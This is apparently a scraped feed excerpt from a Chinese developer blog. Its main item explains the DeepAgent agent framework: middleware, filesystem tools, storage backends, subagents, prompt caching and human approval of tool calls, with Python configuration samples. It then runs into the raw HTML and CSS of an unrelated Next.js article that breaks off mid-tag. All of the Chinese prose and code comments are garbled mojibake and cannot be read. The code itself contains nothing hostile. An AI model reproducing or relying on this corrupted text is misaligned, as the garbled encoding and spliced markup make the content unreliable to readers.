<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3bf01a98ee241d08756ae458928fabb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764464104&amp;x-signature=95mZ5Rb5fAcSdoc0GK5RyHGXL88%3D" alt="DeepAgentæ ¸å¿ƒæ¶æ„" loading="lazy"/></p>
<h2 data-id="heading-0">æ ¸å¿ƒæ¶æ„</h2>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯ Agent Harness</h3>
<p><code>DeepAgent</code>å°†è‡ªå·±å®šä½ä¸º<code>Agent Harness</code>ï¼Œå®ƒæœ¬è´¨ä¸Šä»æ˜¯å·¥å…·è°ƒç”¨å¾ªç¯ï¼Œä½†é›†æˆäº†è®©æ™ºèƒ½ä½“<strong>æ·±åº¦æ€è€ƒ</strong>çš„æ ¸å¿ƒèƒ½åŠ›ã€‚ä¸ä¼ ç»Ÿæ¡†æ¶ä¸åŒï¼Œ<code>DeepAgent</code>é€šè¿‡å†…ç½®å·¥å…·å’Œèƒ½åŠ›ï¼Œè®©å¼€å‘è€…ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘ï¼Œè€ŒéåŸºç¡€è®¾æ–½æ­å»ºã€‚</p>
<h3 data-id="heading-2">æ¨¡å—åŒ–çš„ä¸­é—´ä»¶</h3>
<p><code>DeepAgent</code>é‡‡ç”¨å¯ç»„åˆçš„ä¸­é—´ä»¶æ¶æ„ï¼Œæ¯ä¸ªä¸­é—´ä»¶è´Ÿè´£ä¸€ä¸ªç‹¬ç«‹çš„èƒ½åŠ›åŸŸã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/beb6dd52c2fe4ed2ae8fe0f26bba9bc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex5bqm5a2m5Lmg5py65Zmo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764464104&amp;x-signature=aCqRVfxjsHWgcaAB6Cq%2BNtMeu%2F8%3D" alt="å†…ç½®çš„ä¸­é—´ä»¶" loading="lazy"/></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> deepagents <span class="hljs-keyword">import</span> create_deep_agent
<span class="hljs-keyword">from</span> deepagents.middleware <span class="hljs-keyword">import</span> TodoListMiddleware, FilesystemMiddleware, SubAgentMiddleware

<span class="hljs-comment"># é»˜è®¤æƒ…å†µä¸‹ï¼Œcreate_deep_agent ä¼šè‡ªåŠ¨é™„åŠ ä¸‰å¤§æ ¸å¿ƒä¸­é—´ä»¶</span>
agent = create_deep_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    <span class="hljs-comment"># ä»¥ä¸‹ä¸­é—´ä»¶ä¼šè‡ªåŠ¨å¯ç”¨ï¼š</span>
    <span class="hljs-comment"># - TodoListMiddleware: æä¾› write_todos è§„åˆ’å·¥å…·</span>
    <span class="hljs-comment"># - FilesystemMiddleware: æä¾› 6 ä¸ªæ–‡ä»¶ç³»ç»Ÿå·¥å…·</span>
    <span class="hljs-comment"># - SubAgentMiddleware: æä¾› task å·¥å…·ç”¨äºå­æ™ºèƒ½ä½“å§”æ‰˜</span>
)
</code></pre>
<p>è¿™ç§è®¾è®¡çš„ä¼˜åŠ¿åœ¨äºå¯ç»„åˆæ€§ï¼Œè®©å¼€å‘è€…å¯ä»¥æ ¹æ®éœ€æ±‚é€‰æ‹©å¯ç”¨ç‰¹å®šä¸­é—´ä»¶ï¼Œæˆ–æ·»åŠ è‡ªå®šä¹‰ä¸­é—´ä»¶æ‰©å±•èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-3">æ–‡ä»¶ç³»ç»Ÿ</h2>
<h3 data-id="heading-4">å…­å¤§æ–‡ä»¶ç³»ç»Ÿå·¥å…·</h3>
<p><code>DeepAgent</code>æä¾›äº†å®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿæ“ä½œèƒ½åŠ›ï¼Œè¿™æ˜¯å…¶åŒºåˆ«äºæµ…å±‚ Agent çš„å…³é”®ç‰¹æ€§ï¼š</p>








































<table><thead><tr><th>å·¥å…·</th><th>åŠŸèƒ½</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td><code>ls</code></td><td>åˆ—å‡ºæ–‡ä»¶åŠå…ƒæ•°æ®ï¼ŒåŒ…æ‹¬å¤§å°å’Œä¿®æ”¹æ—¶é—´ç­‰</td><td>æ¢ç´¢ç›®å½•ç»“æ„</td></tr><tr><td><code>read_file</code></td><td>è¯»å–æ–‡ä»¶å†…å®¹ï¼Œæ”¯æŒè¡Œå·å’Œåˆ†é¡µ</td><td>åˆ†å—è¯»å–å¤§æ–‡ä»¶</td></tr><tr><td><code>write_file</code></td><td>åˆ›å»ºæ–°æ–‡ä»¶</td><td>ä¿å­˜ä¸­é—´ç»“æœ</td></tr><tr><td><code>edit_file</code></td><td>ç²¾ç¡®å­—ç¬¦ä¸²æ›¿æ¢</td><td>æ›´æ–°å·²æœ‰æ–‡ä»¶</td></tr><tr><td><code>glob</code></td><td>æ¨¡å¼åŒ¹é…æŸ¥æ‰¾æ–‡ä»¶</td><td>æ‰¹é‡æŸ¥æ‰¾æ–‡ä»¶</td></tr><tr><td><code>grep</code></td><td>æœç´¢æ–‡ä»¶å†…å®¹</td><td>ä»£ç æœç´¢ï¼Œå†…å®¹å®šä½</td></tr></tbody></table>
<h3 data-id="heading-5">è‡ªåŠ¨å‹ç¼©æœºåˆ¶</h3>
<p>å½“å·¥å…·è¿”å›ç»“æœè¶…å‡ºtokené˜ˆå€¼æ—¶ï¼Œ<code>DeepAgent</code>ä¼šè‡ªåŠ¨å°†å…¶è½¬å‚¨åˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œé˜²æ­¢ä¸Šä¸‹æ–‡çª—å£é¥±å’Œï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼ªä»£ç ç¤ºä¾‹ï¼šè‡ªåŠ¨é©±é€é€»è¾‘</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_tool_result</span>(<span class="hljs-params">result, threshold=<span class="hljs-number">2000</span></span>):
    <span class="hljs-keyword">if</span> count_tokens(result) &gt; threshold:
        file_path = <span class="hljs-string">f"/temp/tool_result_<span class="hljs-subst">{uuid4()}</span>.txt"</span>
        write_file(file_path, result)
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"Large result saved to <span class="hljs-subst">{file_path}</span>. Use read_file to access."</span>
    <span class="hljs-keyword">return</span> result
</code></pre>
<p>è¿™ç¡®ä¿äº†å³ä½¿è°ƒç”¨è¿”å›æµ·é‡æ•°æ®çš„å·¥å…·ï¼ˆå¦‚Web æœç´¢ã€æ•°æ®åº“æŸ¥è¯¢ç­‰ï¼‰ï¼Œæ™ºèƒ½ä½“ä¹Ÿèƒ½é€šè¿‡æ–‡ä»¶ç³»ç»Ÿåˆ†å—è¯»å–ï¼Œè€Œä¸ä¼šå¯¼è‡´ä¸Šä¸‹æ–‡å´©æºƒã€‚</p>
<h2 data-id="heading-6">çµæ´»çš„æŒä¹…åŒ–ç­–ç•¥</h2>
<h3 data-id="heading-7">BackendProtocol åè®®è®¾è®¡</h3>
<p><code>DeepAgent</code>å°†æ–‡ä»¶ç³»ç»Ÿæ“ä½œæŠ½è±¡ä¸º<code>BackendProtocol</code>åè®®ï¼Œæ”¯æŒå¤šç§å­˜å‚¨ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> deepagents.backends <span class="hljs-keyword">import</span> StateBackend, FilesystemBackend, StoreBackend, CompositeBackend

<span class="hljs-comment"># 1. StateBackendï¼šçŸ­æœŸå†…å­˜ï¼ˆé»˜è®¤ï¼‰</span>
agent = create_deep_agent()  <span class="hljs-comment"># æ–‡ä»¶å­˜å‚¨åœ¨ LangGraph State ä¸­</span>

<span class="hljs-comment"># 2. FilesystemBackendï¼šæœ¬åœ°ç£ç›˜æŒä¹…åŒ–</span>
agent = create_deep_agent(
    backend=FilesystemBackend(root_dir=<span class="hljs-string">"/Users/agent/workspace"</span>, virtual_mode=<span class="hljs-literal">True</span>)
)

<span class="hljs-comment"># 3. StoreBackendï¼šè·¨çº¿ç¨‹æŒä¹…åŒ–ï¼ˆLangGraph Storeï¼‰</span>
<span class="hljs-keyword">from</span> langgraph.store.memory <span class="hljs-keyword">import</span> InMemoryStore
agent = create_deep_agent(
    backend=<span class="hljs-keyword">lambda</span> rt: StoreBackend(rt),
    store=InMemoryStore()
)

<span class="hljs-comment"># 4. CompositeBackendï¼šæ··åˆå­˜å‚¨è·¯ç”±</span>
composite = <span class="hljs-keyword">lambda</span> rt: CompositeBackend(
    default=StateBackend(rt),  <span class="hljs-comment"># ä¸´æ—¶æ–‡ä»¶ç”¨ State</span>
    routes={
        <span class="hljs-string">"/memories/"</span>: StoreBackend(rt),  <span class="hljs-comment"># é•¿æœŸè®°å¿†æŒä¹…åŒ–</span>
        <span class="hljs-string">"/workspace/"</span>: FilesystemBackend(root_dir=<span class="hljs-string">"/real/path"</span>)  <span class="hljs-comment"># å·¥ä½œæ–‡ä»¶æ˜ å°„åˆ°ç£ç›˜</span>
    }
)
agent = create_deep_agent(backend=composite, store=InMemoryStore())
</code></pre>
<h3 data-id="heading-8">è·¯ç”±ç­–ç•¥ç¤ºä¾‹</h3>
<p>ä½¿ç”¨<code>CompositeBackend</code>æ—¶ï¼Œä¸åŒè·¯å¾„å‰ç¼€çš„æ–‡ä»¶ä¼šè·¯ç”±åˆ°ä¸åŒçš„åç«¯ï¼š</p>
<ul>
<li>
<p><code>/workspace/plan.md</code> â†’ StateBackendï¼ˆçŸ­æœŸï¼‰</p>
</li>
<li>
<p><code>/memories/agent_context.txt</code> â†’ StoreBackendï¼ˆè·¨ä¼šè¯æŒä¹…åŒ–ï¼‰</p>
</li>
<li>
<p><code>/docs/api_spec.yaml</code> â†’ FilesystemBackendï¼ˆçœŸå®æ–‡ä»¶ç³»ç»Ÿï¼‰</p>
</li>
</ul>
<p>è¿™ç§è®¾è®¡è®©æ™ºèƒ½ä½“èƒ½å¤ŸåŒæ—¶ç®¡ç†ä¸´æ—¶è‰ç¨¿å’Œé•¿æœŸçŸ¥è¯†åº“ã€‚</p>
<h2 data-id="heading-9">å­æ™ºèƒ½ä½“æœºåˆ¶</h2>
<h3 data-id="heading-10">ä¸ºä»€ä¹ˆéœ€è¦å­æ™ºèƒ½ä½“</h3>
<p>å­æ™ºèƒ½ä½“è§£å†³äº†ä¸Šä¸‹æ–‡è†¨èƒ€é—®é¢˜ï¼Œå®ç°ä»»åŠ¡å§”æ‰˜ä¸ä¸Šä¸‹æ–‡éš”ç¦»ã€‚å½“æ™ºèƒ½ä½“ä½¿ç”¨å¤§è¾“å‡ºå·¥å…·ï¼ˆå¦‚å¤šæ¬¡ Web æœç´¢ï¼‰æ—¶ï¼Œä¸»æ™ºèƒ½ä½“çš„ä¸Šä¸‹æ–‡ä¼šè¿…é€Ÿå¡«æ»¡ä¸­é—´ç»“æœã€‚å­æ™ºèƒ½ä½“é€šè¿‡éš”ç¦»è¯¦ç»†å·¥ä½œï¼Œè®©ä¸»æ™ºèƒ½ä½“åªæ¥æ”¶æœ€ç»ˆç»“æœï¼Œè€Œéç”Ÿæˆè¯¥ç»“æœçš„å‡ åæ¬¡å·¥å…·è°ƒç”¨ã€‚</p>
<h3 data-id="heading-11">ä¸¤ç§å®šä¹‰æ–¹å¼</h3>
<ol>
<li>å­—å…¸é…ç½®</li>
</ol>
<pre><code class="hljs language-python" lang="python">research_subagent = {
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"research-agent"</span>,
    <span class="hljs-string">"description"</span>: <span class="hljs-string">"ç”¨äºæ·±åº¦ç ”ç©¶å¤æ‚é—®é¢˜"</span>,
    <span class="hljs-string">"system_prompt"</span>: <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ç ”ç©¶åŠ©æ‰‹ï¼Œæ“…é•¿å¤šæ­¥éª¤ä¿¡æ¯æ”¶é›†å’Œç»¼åˆ"</span>,
    <span class="hljs-string">"tools"</span>: [internet_search, summarize],
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"openai:gpt-4o"</span>,  <span class="hljs-comment"># å¯é€‰ï¼šè¦†ç›–ä¸»æ™ºèƒ½ä½“æ¨¡å‹</span>
    <span class="hljs-string">"interrupt_on"</span>: {<span class="hljs-string">"internet_search"</span>: <span class="hljs-literal">True</span>}  <span class="hljs-comment"># å¯é€‰ï¼šHITL é…ç½®</span>
}

agent = create_deep_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    subagents=[research_subagent]
)
</code></pre>
<ol start="2">
<li>ç¼–è¯‘å›¾</li>
</ol>
<p>å¯¹äºå¤æ‚å·¥ä½œæµï¼Œå¯ä»¥ä½¿ç”¨é¢„æ„å»ºçš„<code>LangGraph</code>å›¾ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> deepagents <span class="hljs-keyword">import</span> CompiledSubAgent
<span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph

<span class="hljs-comment"># åˆ›å»ºè‡ªå®šä¹‰å›¾</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_analysis_graph</span>():
    workflow = StateGraph(...)
    <span class="hljs-comment"># ... æ„å»ºå¤æ‚çš„åˆ†ææµç¨‹</span>
    <span class="hljs-keyword">return</span> workflow.<span class="hljs-built_in">compile</span>()

analysis_subagent = CompiledSubAgent(
    name=<span class="hljs-string">"data-analyzer"</span>,
    description=<span class="hljs-string">"æ‰§è¡Œå¤šæ­¥éª¤æ•°æ®åˆ†æä»»åŠ¡"</span>,
    runnable=create_analysis_graph()
)

agent = create_deep_agent(subagents=[analysis_subagent])
</code></pre>
<h3 data-id="heading-12">é»˜è®¤å­æ™ºèƒ½ä½“</h3>
<p>é™¤äº†ç”¨æˆ·å®šä¹‰çš„å­æ™ºèƒ½ä½“ï¼Œ<code>DeepAgent</code>å§‹ç»ˆæä¾›ä¸€ä¸ª<code>general-purpose</code>å­æ™ºèƒ½ä½“ï¼š</p>
<ul>
<li>
<p>ä¸ä¸»æ™ºèƒ½ä½“ç›¸åŒçš„ç³»ç»Ÿæç¤ºè¯å’Œå·¥å…·</p>
</li>
<li>
<p>ä¸»è¦ç”¨é€”ï¼šä¸Šä¸‹æ–‡éš”ç¦»ï¼ˆè€Œéä¸“ä¸šåŒ–ï¼‰</p>
</li>
<li>
<p>ä½¿ç”¨åœºæ™¯ï¼šä¸»æ™ºèƒ½ä½“å¯ä»¥å°†å¤æ‚ä»»åŠ¡å§”æ‰˜ç»™å®ƒï¼Œè·å¾—ç®€æ´ç»“æœè€Œä¸å—ä¸­é—´è¿‡ç¨‹æ±¡æŸ“</p>
</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¸»æ™ºèƒ½ä½“å¯ä»¥è¿™æ ·ä½¿ç”¨ï¼š</span>
<span class="hljs-comment"># "è¯·ä½¿ç”¨ general-purpose å­æ™ºèƒ½ä½“åˆ†æè¿™ 100 ä¸ªæ–‡ä»¶ï¼Œè¿”å›æ‘˜è¦"</span>
<span class="hljs-comment"># å­æ™ºèƒ½ä½“å®Œæˆå·¥ä½œåï¼Œä¸»æ™ºèƒ½ä½“åªæ”¶åˆ°æ‘˜è¦ï¼Œè€Œé 100 æ¬¡æ–‡ä»¶è¯»å–çš„è¯¦ç»†å†…å®¹</span>
</code></pre>
<h2 data-id="heading-13">ç”Ÿäº§çº§ç‰¹æ€§</h2>
<p>é’ˆå¯¹ç”Ÿäº§ç¯å¢ƒï¼Œ<code>DeepAgent</code>è¿˜æä¾›äº†è®¸å¤šæœ‰ç”¨çš„ç‰¹æ€§ã€‚</p>
<h3 data-id="heading-14">1. å¯¹è¯å†å²è‡ªåŠ¨æ‘˜è¦</h3>
<p>å½“ token ä½¿ç”¨é‡è¿‡é«˜æ—¶ï¼Œ<code>DeepAgent</code>ä¼šè‡ªåŠ¨å‹ç¼©æ—§å¯¹è¯å†å²ï¼š</p>
<pre><code class="hljs language-python" lang="python">agent = create_deep_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    <span class="hljs-comment"># é…ç½®æ‘˜è¦è§¦å‘é˜ˆå€¼å’Œç›®æ ‡é•¿åº¦</span>
)
</code></pre>
<h3 data-id="heading-15">2. å·¥å…·è°ƒç”¨è‡ªåŠ¨ä¿®å¤</h3>
<p>å½“å·¥å…·è°ƒç”¨è¢«ä¸­æ–­æˆ–å–æ¶ˆæ—¶ï¼Œ<code>DeepAgent</code>ä¼šè‡ªåŠ¨ä¿®å¤æ¶ˆæ¯å†å²ï¼š</p>
<p><strong>é—®é¢˜åœºæ™¯</strong>ï¼šç”¨æˆ·åœ¨å·¥å…·æ‰§è¡Œè¿‡ç¨‹ä¸­å–æ¶ˆæ“ä½œï¼Œå¯¼è‡´<code>tool_call</code>æ¶ˆæ¯æ²¡æœ‰å¯¹åº”çš„<code>tool_result</code>ï¼Œç ´åäº†æ¶ˆæ¯åºåˆ—çš„å®Œæ•´æ€§ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š<code>DeepAgent</code>ä¼šè‡ªåŠ¨æ³¨å…¥å ä½ç¬¦<code>ToolMessage</code>ï¼Œç¡®ä¿æ¶ˆæ¯å†å²çš„è¿è´¯æ€§ï¼Œé¿å… LLM åœ¨åç»­è½®æ¬¡ä¸­å› ä¸å®Œæ•´çš„ä¸Šä¸‹æ–‡è€Œäº§ç”Ÿå›°æƒ‘ã€‚</p>
<h3 data-id="heading-16">3. Promptç¼“å­˜æœºåˆ¶</h3>
<p>å¯¹äºä½¿ç”¨Anthropicæ¨¡å‹çš„æ™ºèƒ½ä½“ï¼Œ<code>DeepAgent</code>å¯ç”¨äº†<code>prompt caching</code>åŠŸèƒ½ï¼š</p>
<ul>
<li>
<p>è‡ªåŠ¨æ ‡è®°å¯ç¼“å­˜çš„æç¤ºè¯éƒ¨åˆ†ï¼ˆå¦‚ç³»ç»Ÿæç¤ºè¯ã€å·¥å…·å®šä¹‰ï¼‰</p>
</li>
<li>
<p>å‡å°‘é‡å¤ token å¤„ç†ï¼Œæ˜¾è‘—é™ä½æˆæœ¬å’Œå»¶è¿Ÿ</p>
</li>
<li>
<p>å¯¹äºé•¿ç³»ç»Ÿæç¤ºè¯çš„æ·±åº¦æ™ºèƒ½ä½“å°¤å…¶æœ‰ä»·å€¼</p>
</li>
</ul>
<h3 data-id="heading-17">4. Human-in-the-Loop</h3>
<p><code>DeepAgent</code>æ”¯æŒåœ¨ç‰¹å®šå·¥å…·è°ƒç”¨æ—¶æš‚åœæ‰§è¡Œï¼Œç­‰å¾…äººå·¥å®¡æ‰¹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> MemorySaver

agent = create_deep_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    tools=[delete_file, send_email, read_file],
    interrupt_on={
        <span class="hljs-string">"delete_file"</span>: <span class="hljs-literal">True</span>,  <span class="hljs-comment"># éœ€è¦å®¡æ‰¹ï¼ˆapprove/edit/rejectï¼‰</span>
        <span class="hljs-string">"send_email"</span>: {<span class="hljs-string">"allowed_decisions"</span>: [<span class="hljs-string">"approve"</span>, <span class="hljs-string">"reject"</span>]},  <span class="hljs-comment"># åªèƒ½æ‰¹å‡†æˆ–æ‹’ç»</span>
        <span class="hljs-string">"read_file"</span>: <span class="hljs-literal">False</span>  <span class="hljs-comment"># æ— éœ€å®¡æ‰¹</span>
    },
    checkpointer=MemorySaver()  <span class="hljs-comment"># HITL å¿…é¡»ä½¿ç”¨ checkpointer</span>
)

<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"session-123"</span>}}
result = agent.invoke({<span class="hljs-string">"messages"</span>: [...]}, config=config)

<span class="hljs-keyword">if</span> result.get(<span class="hljs-string">"__interrupt__"</span>):
    <span class="hljs-comment"># å¤„ç†ä¸­æ–­ï¼Œå±•ç¤ºå¾…å®¡æ‰¹æ“ä½œ</span>
    interrupts = result[<span class="hljs-string">"__interrupt__"</span>][<span class="hljs-number">0</span>].value
    action_requests = interrupts[<span class="hljs-string">"action_requests"</span>]
    
    <span class="hljs-comment"># ç”¨æˆ·å†³ç­–</span>
    decisions = [{<span class="hljs-string">"type"</span>: <span class="hljs-string">"approve"</span>}]  <span class="hljs-comment"># æˆ– "edit"ã€"reject"</span>
    
    <span class="hljs-comment"># æ¢å¤æ‰§è¡Œ</span>
    result = agent.invoke(
        Command(resume={<span class="hljs-string">"decisions"</span>: decisions}),
        config=config  <span class="hljs-comment"># å¿…é¡»ä½¿ç”¨ç›¸åŒçš„ config</span>
    )
</code></pre>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p><code>DeepAgent</code>å®ç°äº†ä»æµ…å±‚Agentåˆ°æ·±åº¦Agentçš„èŒƒå¼è½¬å˜ï¼Œå…¶æ ¸å¿ƒä»·å€¼åœ¨äºå°†å¤æ‚ä»»åŠ¡è‡ªåŠ¨åŒ–ç³»ç»Ÿæ‰€éœ€çš„æ ¸å¿ƒèƒ½åŠ›å°è£…ä¸ºå¯ç»„åˆã€ç”Ÿäº§å°±ç»ªçš„<strong>æ¨¡å—åŒ–ä¸­é—´ä»¶</strong>ã€‚</p>
<p>æœ‰äº†è¿™äº›ç”Ÿäº§ç‰¹æ€§ï¼Œæ— è®ºæ˜¯åœ¨æ„å»ºç ”ç©¶åŠ©æ‰‹ã€ä»£ç ç”Ÿæˆå·¥å…·ã€æ•°æ®åˆ†æå¹³å°è¿˜æ˜¯æ™ºèƒ½å®¢æœç³»ç»Ÿï¼Œ<code>DeepAgent</code>çš„è®¾è®¡æ¨¡å¼éƒ½å€¼å¾—æ·±å…¥å­¦ä¹ å’Œåº”ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.jsç¬¬åç« (Proxy)]]></title>    <link>https://juejin.cn/post/7575458028254822443</link>    <guid>https://juejin.cn/post/7575458028254822443</guid>    <pubDate>2025-11-23T13:00:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575458028254822443" data-draft-id="7575442779039334442" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.jsç¬¬åç« (Proxy)"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-11-23T13:00:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°æ»¡zs"/> <meta itemprop="url" content="https://juejin.cn/user/2463384809252397"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.jsç¬¬åç« (Proxy)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2463384809252397/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°æ»¡zs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T13:00:39.000Z" title="Sun Nov 23 2025 13:00:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 